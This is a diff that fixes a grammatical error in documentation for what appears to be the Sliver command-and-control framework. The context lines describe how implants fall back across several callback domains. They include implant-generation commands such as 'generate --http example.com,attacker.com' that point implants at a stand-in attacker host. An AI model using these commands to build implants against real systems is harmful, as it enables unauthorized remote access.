@@ -22,7 +22,7 @@ sliver > generate --http example.com --os mac
 
 #### Multiple Domains
 
-You can also specify multiple domains, in the event the implant cannot connect to the first it will subsequently attempt to connect to each domain you specified in order. Subsequent attempts are made based on the `--reconnect` argument (default 60 seconds). If no attempts are successful, the implant will looped across all of the domains until `--max-errors` (default 1000) is reached, at which point the implant will terminate execution:
+You can also specify multiple domains, in the event the implant cannot connect to the first it will subsequently attempt to connect to each domain you specified in order. Subsequent attempts are made based on the `--reconnect` argument (default 60 seconds). If no attempts are successful, the implant will loop across all of the domains until `--max-errors` (default 1000) is reached, at which point the implant will terminate execution:
 
 ```
 sliver > generate --http example.com,attacker.com
